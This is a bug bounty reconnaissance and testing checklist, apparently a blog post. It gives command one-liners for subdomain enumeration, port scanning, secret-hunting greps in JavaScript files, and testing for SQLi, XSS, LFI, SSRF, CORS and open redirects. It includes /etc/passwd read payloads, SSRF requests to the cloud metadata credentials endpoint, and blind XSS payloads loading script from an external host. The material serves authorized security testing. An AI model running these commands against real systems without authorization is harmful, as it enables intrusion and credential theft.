# RECON Mythodolgy

# **Recon to Master: The Complete Bug Bounty Checklist**

# **Introduction**

**Reconnaissance (recon)** is the foundation of any successful bug bounty hunt. Mastering recon means you can uncover hidden assets, vulnerable endpoints and sensitive data that others miss. This guide walks you through the best recon methodologies to elevate your bug bounty skills.

# **Table of Contents**

```
1. Finding Subdomains with Tools
2. Manual Subdomain Discovery via Public Sources
3. GitHub Subdomain Enumeration
4. Merging & Sorting Subdomains with DNS Resolution
5. Brute-Forcing Subdomains using FFUF
6. IP Discovery using ASN Mapping & APIs
7. Asset Discovery with Amass Intel
8. Finding Live Hosts using HTTPX
9. Visual Reconnaissance with Aquatone
10. Crawling URLs using Katana and Hakrawler
11. Collecting Historical URLs with GAU & Wayback
12. Extracting Parameters from URLs with Regex & GF
13. Automated Vulnerability Scanning with Nuclei
14. Customizing & Using Nuclei Templates
15. Finding Sensitive Files via Regex & Wordlists
16. Discovering Hidden Parameters with Arjun
17. Directory & File Bruteforce with Dirsearch and FFUF…
```

# **Finding Subdomains**

The first step in my process is to gather as many subdomains of the target as possible using various sources. Below are some of the tools and commands I use for comprehensive subdomain enumeration

## **Automated Enumeration with Tools**

```php
subfinder -d example.com -all -recursive -o subfinder.txt
assetfinder --subs-only example.com > assetfinder.txt
findomain -t target.com |tee findomain.txt

amass enum -passive -d example.com |cut -d']' -f 2 | awk'{print $1}' |sort -u > amass.txt
amass enum -active -d example.com |cut -d']' -f 2 | awk'{print $1}' |sort -u > amass.txt
```

Make sure to configure and provide all necessary API keys for each data source so the tools can access their full range of information and deliver more comprehensive results.

## **Public Sources (Manual/Custom)**

You can also directly fetch subdomains from public sources using curl tool, which is especially useful for manual reconnaissance. Public sources can reveal subdomains missed by automated tools

```powershell
curl -s https://crt.sh\?q\=\domain.com\&output\=json | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' >crtsh.txt
curl -s "http://web.archive.org/cdx/search/cdx?url=*.hackerone.com/*&output=text&fl=original&collapse=urlkey" |sort| sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' | sort -u > wayback.txt
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=[api-key]&domain=www.nasa.gov" | jq -r '.domain_siblings[]' | >virustotal.txt
```

## **GitHub Subdomain Scraping**

Another solid technique is using the GitHub Subdomains tool. It scrapes subdomains from public GitHub repositories of organizations or users. Make sure to use a GitHub API key to avoid rate-limiting issues.

```perl
github-subdomains -d domain.com -t [github_token]
```

[**GitHub - gwen001/github-subdomains: Find subdomains on GitHub.Find subdomains on GitHub. Contribute to gwen001/github-subdomains development by creating an account on GitHub.**
github.com](https://github.com/gwen001/github-subdomains?source=post_page-----95b80ea55ff0---------------------------------------)

## **Merging & Deduplication**

Next, combine all the subdomain files into a single organized list and eliminate duplicates using the following command:

```perl
cat *.txt | sort -u > final.txt
```

## **Subdomain Permutation & DNS Resolution**

You can create subdomain variations by generating patterns based on the existing ones.

```perl
subfinder -d domain.com | alterx | dnsx
echo doamin.com | alterx -enrich | dnsx
echo doamin.com | alterx -pp word=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | dnsx
```

This will generate all possible permutations of the given domain that might not be found through other sources. It then resolves them and returns only the live active subdomains using dnsx tool

## **Brute-force Subdomains Using FFUF**

You can also use **ffuf** for subdomain brute-forcing. it tests each word from the wordlist against the target domain to identify valid subdomains.

```perl
ffuf -u "https://FUZZ.target.com" -w wordlist.txt -mc 200,301,302
```

# **Discover Hosts via IP Address and ASN Mapping**

You can use **AS (Autonomous System)** mapping to discover a wide range of IP addresses associated with a domain. This helps uncover additional infrastructure related to the target.

## **ASN & IP Discovery**

```perl
asnmap -d domain.com | dnsx -silent -resp-only
```

This will retrieve all IP addresses associated with the specified ASN and resolve them to reveal the active IPs within its CIDR range.

## **Discovering Assets with Amass**

After enumerating subdomains, a great way to expand your attack surface is by identifying related infrastructure owned by the target organization. This includes discovering additional domains, IP ranges and subdomains associated with the company. The amass intel module is perfect for this task.

```perl
amass intel -org "nasa"
amass intel -active -cidr 159.69.129.82/32
amass intel -active -asn [asnno]
```

these commands help you **map out the organization’s digital footprint** based on organization names, IP ranges (CIDRs) and ASNs (Autonomous System Numbers).

## **Harvesting IP Addresses Linked to Domains**

This section covers multiple techniques to extract IP addresses linked to domains using public APIs, historical data and search engines. helping you uncover backend infrastructure and allowing you to resolve and test each IP for active services.

```haskell
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=<DOMAIN>&apikey=[api-key]" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/<DOMAIN>/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
curl -s "https://urlscan.io/api/v1/search/?q=domain:<DOMAIN>&size=10000" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
cat domains.txt | cut -d']' -f2 | awk '{print $2}' | tr ',' '\n' | sort -u > amass.txt
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
shodan search Ssl.cert.subject.CN:"<DOMAIN>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
```

# **Discover Live Hosts**

After gathering a large number of subdomains and IPs from various sources, the next step is to filter out the live and accessible ones using the **httpx-toolkit**

```haskell
cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
```

This command actively probes the discovered subdomains across a set of specified ports to identify responsive hosts. Since httpx targets only default ports by default, so it’s important to manually specify additional frequently used ports for broader coverage. and Using 200 threads significantly speeds up the scanning process when dealing with a large number of subdomains

# **Visual Recon with Aquatone**

Once you have a list of live domains, tools like **Aquatone** help you take recon to the next level by capturing visual screenshots of each site’s homepage. This gives you a quick overview of your targets, helping you spot login pages, admin panels, staging environments and more all at a glance.

```haskell
cat hosts.txt | aquatone
cat hosts.txt | aquatone -ports 80,443,8000,8080,8443
cat hosts.txt | aquatone -ports 80,81,443,591,2082,2087,2095,2096,3000,8000,8001,8008,8080,8083,8443,8834,8888
```

# **URL Collection and Analysis**

Once we have live subdomains, we need to discover URLs and endpoints from active/passive sources using various tools:

## **Active Crawling**

```haskell
katana -u livesubdomains.txt -d 2 -o urls.txt
cat urls.txt | hakrawler -u > urls3.txt
```

## **Passive Crawling**

```perl
cat livesubdomains.txt | gau | sort -u > urls2.txt
urlfinder -d tesla.com | sort -u >urls3.txt
echo example.com | gau --mc 200 | urldedupe >urls.txtcat urls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sort > output.txtcat output.txt | sed 's/=.*/=/' >final.txt
```

## **Param Extraction**

Once you’ve collected a large list of URLs during recon, the next step is to extract only those URLs that contain parameters. ideal targets for testing vulnerabilities like XSS, SQLi, Open Redirect and for running **Nuclei DAST** templates.

```haskell
cat allurls.txt | grep '=' | urldedupe | tee output.txt
or:
cat allurls.txt | grep -E '\?[^=]+=.+$' | tee output.txt
```

# **Parameter Discovery Using gf Patterns**

gf (Gf-Patterns) is a powerful tool that helps you filter URLs based on patterns commonly associated with vulnerabilities like XSS, SQLi, LFI, SSRF, Open Redirect and more.

By using predefined or custom patterns, you can quickly extract high-priority URLs from large recon files. making your workflow faster and more targeted for example:

```haskell
cat allurls.txt | gf sqli
```

[**GitHub - coffinxp/GFpattrenContribute to coffinxp/GFpattren development by creating an account on GitHub.**
github.com](https://github.com/coffinxp/GFpattren?source=post_page-----95b80ea55ff0---------------------------------------)

# **Nuclei: Automate Your Vulnerability Discovery**

Nuclei is a powerful, fast and flexible tool for automated vulnerability scanning. It uses a template-based engine to scan URLs for known misconfigurations, CVEs, exposures and more making it ideal for both recon and active testing in bug bounty hunting or pentesting workflows.

```haskell
nuclei -u https://target.com -bs 50 -c 30
nuclei -l live_domains.txt -bs 50 -c 30
```

Use the batch size flag to set how many templates to run at once, and the concurrency flag to define how many domains to scan simultaneously. This massively speeds up the process and helps you detect known issues quickly. You can also use my **personal Nuclei template collection** available here👇

[**GitHub - coffinxp/nuclei-templatesContribute to coffinxp/nuclei-templates development by creating an account on GitHub.**
github.com](https://github.com/coffinxp/nuclei-templates?source=post_page-----95b80ea55ff0---------------------------------------)

# **Sensitive File Discovery**

From the collected URLs, we can identify potentially sensitive files (e.g., backups, config files, logs) that may lead to information disclosure vulnerabilities a common yet impactful bug category worth reporting.

```haskell
cat allurls.txt | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"
cat allurls.txt | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"
site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
```

This regex filters URLs that end with file extensions commonly associated with sensitive documents, configuration files, or backups, often a goldmine for information disclosure vulnerabilities.

# **Hidden Parameter Discovery**

Uncovering undocumented GET/POST parameters can lead to serious vulnerabilities such as injections, IDORs or business logic bypasses. Here’s how you can discover them effectively:

```haskell
Passive parameter discovery:
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"

Active parameter discovery with wordlist:
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"
```

- oT sets the output format to text, -t 10 uses 10 threads, — rate-limit 10 limits to 10 requests per second, — passive enables passive discover and -m GET,POST tests both GET and POST methods.

# **Directory & File Bruteforcing**

Reveal hidden directories and files by brute-forcing common paths and extensions a crucial technique to uncover admin panels, backups, development files or misconfigured endpoints that are not publicly linked but still accessible.

## **Using Dirsearch**

```haskell
dirsearch -u https://example.com  --full-url --deep-recursive -r
dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1
```

## **Using FFUF**

```haskell
ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-Host: localhost" -t 100 -r -o results.json
ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://ens.domains/FUZZ  -fc 401,403,404  -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf -ac -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -r -t 60 --rate 100 -c
```

You can use my GitHub repository where I’ve collected a wide range of payloads useful for fuzzing different types of bugs, including XSS, LFI, SSRF, Open Redirect and more. It’s a handy resource to speed up your testing workflow.

[**GitHub - coffinxp/payloadsContribute to coffinxp/payloads development by creating an account on GitHub.**
github.com](https://github.com/coffinxp/payloads?source=post_page-----95b80ea55ff0---------------------------------------)

# **JavaScript File Discovery and Analysis**

JavaScript files often contain valuable information such as hidden API endpoints, internal functions, parameter names, hardcoded credentials, tokens, even sensitive keys and Development comments and debugging information. Analyzing these files can give deep insight into the application’s logic and uncover attack surfaces that aren’t visible in the frontend.

## **JS file hunting:**

```haskell
echo example.com | katana -d 3 | grep -E "\.js$" | nuclei -t $HOME/nuclei-templates/http/exposures/ -c 30
cat jsfiles.txt | grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret"
cat allurls.txt | grep -E "\.js$" | httpx-toolkit -mc 200 -content-type | grep -E "application/javascript|text/javascript" | cut -d' ' -f1 | xargs -I% curl -s % | grep -E "(API_KEY|api_key|apikey|secret|token|password)"
```

## **Bulk JS analysis:**

```haskell
echo domain.com | katana -ps -d 2 | grep -E "\.js$" | nuclei -t /nuclei-templates/http/exposures/ -c 30
cat alljs.txt | nuclei -t $HOME/nuclei-templates/http/exposures/
```

[**How to Identify Sensitive Data in JavaScript Files: (JSRecon)Find sensitive data in Jsfiles**
osintteam.blog](https://osintteam.blog/how-to-identify-sensitive-data-in-javascript-files-jsrecon-306b8a2e6462?source=post_page-----95b80ea55ff0---------------------------------------)

# **Content-Type Filtering**

Filter content based on MIME types to identify JS or HTML pages for further analysis. This helps you focus on files that are most likely to contain valuable endpoints, parameters or client-side logic worth analyzing further.

## **HTML content Filtering**

```haskell
echo domain | gau | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'
```

## **JavaScript content Filtering**

```haskell
echo domain | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
```

# **WordPress Security Testing**

If the target site runs on WordPress, enumerate users, plugins, themes and version details. This helps identify outdated components, misconfigurations and potential attack vectors such as vulnerable plugins or exposed admin panels.

```perl
wpscan --url https://site.com --disable-tls-checks --api-token <here> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
```

- e at: Enumerate all themes
- e ap: Enumerate all plugins
- e u: Enumerate users
- — plugins-detection aggressive: Aggressive plugin detection
- — force: Force scan even if WordPress not detected

[**payloads/coffin@wp-fuzz.txt at main · coffinxp/payloadsContribute to coffinxp/payloads development by creating an account on GitHub.**
github.com](https://github.com/coffinxp/payloads/blob/main/coffin%40wp-fuzz.txt?source=post_page-----95b80ea55ff0---------------------------------------)

# **Network-Level Recon**

Scan the target for open ports, running services and software versions. This helps you find vulnerable or misconfigured services that may not be visible from the web interface.

## **Port Scanning with Naabu**

```haskell
naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt
```

## **Nmap full scan**

```perl
nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan
```

## **Masscan for speed**

```perl
masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt
```

# **Vulnerability Discovery**

After collecting all domains and URLs, it’s time to move from information gathering to actual testing. This is where recon meets exploitation. Now use the data you’ve collected to start testing for real vulnerabilities using different tools and techniques.

# **SQL Injection Testing**

SQL Injection is still one of the most dangerous and impactful web vulnerabilities. Here’s a practical approach to identify and exploit it effectively

```haskell
for possible SQL technology detection:
subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'

for single domain:
subfinder -d http://example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
```

This command will filter out URLs using technologies and patterns that are commonly vulnerable to SQL injection, helping you prioritize high-risk targets for testing.

```haskell
for possible SQL Endpoints:
echo http://site.com | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep -E '\?[^=]+=.+$'
```

This command filters URLs with extensions commonly linked to SQL injection vulnerabilities. For a more detailed write-up on SQL injection techniques, check out this article here 👇

[**Mastering SQL Injection Recon: Step-by-Step Guide for Bug Bounty HuntersA practical guide to uncovering SQL injection flaws using automation, payloads and deep reconnaissance techniques.**
infosecwriteups.com](https://infosecwriteups.com/mastering-sql-injection-recon-step-by-step-guide-for-bug-bounty-hunters-9f493fb058dd?source=post_page-----95b80ea55ff0---------------------------------------)

# **Cross-Site Scripting (XSS) Testing**

XSS is a common and dangerous vulnerability that lets attackers inject malicious scripts into web pages, leading to session hijacking, redirects or defacement. Start with these one-liners for quick detection, then move on to advanced techniques like blind XSS and parameter fuzzing for deeper testing.

```haskell
echo "target.com" | gau | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox
echo "example.com" | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln
echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt
```

## **XSS Testing Using FFUF Request Mode**

```haskell
ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr "<script>alert('XSS')</script>"
```

## **Blind XSS Testing**

```haskell
cat urls.txt | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high
```

```haskell
subfinder -d example.com | gau | bxss -payload '"><script src=https://xss.report/c/coffinxp></script>' -header "X-Forwarded-For"
subfinder -d example.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence
```

[**Find XSS Vulnerabilities in Just 2 MinutesBest xss automation ever**
osintteam.blog](https://osintteam.blog/find-xss-vulnerabilities-in-just-2-minutes-d14b63d000b1?source=post_page-----95b80ea55ff0---------------------------------------)

# **Local File Inclusion (LFI) Testing**

Local File Inclusion (LFI) is a vulnerability that lets attackers include and read files from the server such as /etc/passwd, log files or configuration files. It can lead to sensitive data exposure, code execution or even full system compromise. Use the following one-liners to automate LFI detection and fuzz for vulnerable parameters.

```haskell
Automated LFI discovery:
nuclei -l subs.txt -t /root/nuclei-templates/http/vulnerabilities/generic/generic-linux-lfi.yaml -c 30
echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
gau target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

Alternative LFI method:
echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\*|\$[^\:]*):0:0:"
echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
```

## **Key components:**

- gf lfi: Filters URLs potentially vulnerable to LFI
- qsreplace “FUZZ”: Replaces parameter values with FUZZ keyword
- ffuf: Fast web fuzzer for testing payloads
- mr “root:(x|\*|\$[^\:]*):0:0:”: Matches Linux passwd file format

## **LFI testing Using FFUF Request Mode**

```haskell
ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr "root:"
```

[**payloads/lfi.txt at main · coffinxp/payloadsContribute to coffinxp/payloads development by creating an account on GitHub.**
github.com](https://github.com/coffinxp/payloads/blob/main/lfi.txt?source=post_page-----95b80ea55ff0---------------------------------------)

# **CORS (Cross-Origin Resource Sharing) Testing**

Misconfigured CORS policies can allow unauthorized domains to access sensitive data or perform privileged actions across origins potentially leading to serious security issues like account takeover or data theft.

This section covers both manual and automated methods to detect insecure CORS configurations using simple curl commands and powerful tools like httpx, nuclei, Corsy and CORScanner.

## **Manual CORS testing using curl**

```haskell
curl -H "Origin: http://example.com" -I https://domain.com/wp-json/
```

## **Detailed CORS analysis**

```haskell
curl -H "Origin: http://example.com" -I https://domain.com/wp-json/ | grep -i -e "access-control-allow-origin" -e "access-control-allow-methods" -e "access-control-allow-credentials"
```

## **Automated CORS testing:**

```haskell
cat example.coms.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt
python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
python3 CORScanner.py -u https://example.com -d -t 10

```

After identifying a potential CORS misconfiguration, you can test it further using my custom **CORS Exploit** for the **PoC**:👇

[**scripts/CorsExploit.html at main · coffinxp/scriptsContribute to coffinxp/scripts development by creating an account on GitHub.**
github.com](https://github.com/coffinxp/scripts/blob/main/CorsExploit.html?source=post_page-----95b80ea55ff0---------------------------------------)

# **Subdomain Takeover Detection**

Subdomain takeover occurs when a subdomain points to an external service (like GitHub Pages, Heroku or S3) that is no longer claimed allowing attackers to hijack it.

Tools like subzy can automate the detection process by checking for takeover signatures across multiple providers, verifying SSL, and using high concurrency for faster results while filtering out false positives.

```perl
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
```

This tool checks for subdomain takeover vulnerabilities by:

- Testing multiple service providers
- Verifying SSL certificates
- Using high concurrency for speed
- Hiding failed attempts to reduce noise

[**GitHub - PentestPad/subzy: Subdomain takeover vulnerability checkerSubdomain takeover vulnerability checker. Contribute to PentestPad/subzy development by creating an account on GitHub.**
github.com](https://github.com/PentestPad/subzy?source=post_page-----95b80ea55ff0---------------------------------------)

After identifying potential subdomain takeover candidates, you can manually verify them using the **can-i-take-over-xyz** repository, which lists known fingerprints and conditions for various services.

[**GitHub - EdOverflow/can-i-take-over-xyz: "Can I take over XYZ?" - a list of services and how to…"Can I take over XYZ?" - a list of services and how to claim (sub)domains with dangling DNS records. …**
github.com](https://github.com/EdOverflow/can-i-take-over-xyz?source=post_page-----95b80ea55ff0---------------------------------------)

# **Git Repository Disclosure**

Exposed .git/ directories can leak sensitive information like source code, credentials and internal logic making them a high-severity issue. This command helps identify .git exposures by filtering valid URLs, probing for the .git/ path and checking for directory listings or exposed content.

```haskell
cat domains.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe
```

## **This command:**

- Filters successful responses
- Uses GF patterns to extract URLs
- Tests for .git/ directory exposure
- Looks for “Index of” in responses
- Checks for directory listing

# **SSRF Testing & Exploitation**

Server-Side Request Forgery (SSRF) is a powerful vulnerability that allows attackers to make the server initiate requests to internal or external resources. This can lead to sensitive data exposure, cloud metadata access, internal port scanning or even remote code execution when chained properly.

This section covers a full SSRF testing workflow from identifying vulnerable parameters, using automation tools, crafting bypass payloads, to chaining SSRF with other vulnerabilities for maximum impact.

```haskell
# Look for common SSRF-prone parameters in URLs

cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u

# Look for API/webhook integrations or cloud metadata patterns
cat urls.txt | grep -i 'webhook\|callback\|upload\|fetch\|import\|api' | sort -u

# Nuclei for automated scanning
cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/
```

```haskell
# Basic SSRF to local services
curl "https://target.com/page?url=http://127.0.0.1:80/"
curl "https://target.com/page?url=http://localhost:8080"

# Target internal cloud metadata
curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Bypass filters with alternative IP formats
http://127.0.0.1%23.google.com
http://127.1
http://[::1]/
http://0x7f000001
http://017700000001

# DNS rebinding or callback for blind SSRF
curl "https://target.com/page?url=http://yourdomain.burpcollaborator.net"
```

[**GitHub - swisskyrepo/SSRFmap: Automatic SSRF fuzzer and exploitation toolAutomatic SSRF fuzzer and exploitation tool. Contribute to swisskyrepo/SSRFmap development by creating an account on…**
github.com](https://github.com/swisskyrepo/SSRFmap?source=post_page-----95b80ea55ff0---------------------------------------)

# **Open Redirect testing**

Open Redirect vulnerabilities allow attackers to redirect users to malicious sites using trusted domain links often used in phishing or session hijacking attacks. This section covers simple to advance methods to detect and test for open redirect issues in URLs and parameters.

```bash
cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt
```

```haskell
final.txt | gf redirect | uro | sort -u | tee redirect_params.txt

cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"

subfinder -d vulnweb.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
```

```haskell
cat redirect_params.txt | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"

echo target.com -all | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"

subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
```

[**From Zero to Hero: Hunting High-Paying Open Redirect Bugs in Web AppsStep-by-Step Guide to Master Open Redirect Bugs and Earn High-Paying Bounties**
infosecwriteups.com](https://infosecwriteups.com/from-zero-to-hero-hunting-high-paying-open-redirect-bugs-in-web-apps-fdb80286236e?source=post_page-----95b80ea55ff0---------------------------------------)

# 📝 Note: This checklist and the methods shared here are still a work in progress. I’ll be adding more advanced techniques and tools as I find time. Make sure to revisit this article in some days or weekly for the latest updates and additions!

# **Conclusion**

This methodology offers a structured and proven approach to web application security testing, built on years of hands-on experience from the bug bounty community. While tools play a role, true success comes from understanding core technologies, thinking like an attacker and staying persistent through trial and error.

**Upnext:** ***If you found this helpful, you’ll definitely want to check out my article How I Found a Critical IDOR in Indian Railways Corporate Booking Portal Exposing Millions of Users’ Personal Data. It’s a real-world case study of impact, exploitation and responsible disclosure*** 👇

[**How I Found a Critical IDOR in Indian Railways Corporate Booking Portal Exposing Millions of Users…A step-by-step breakdown of how a simple IDOR vulnerability exposed confidential personal details, allowed unauthorized…**
infosecwriteups.com](https://infosecwriteups.com/how-i-found-a-critical-idor-in-indian-railways-corporate-booking-portal-exposing-millions-of-users-41fdd2145efe?source=post_page-----95b80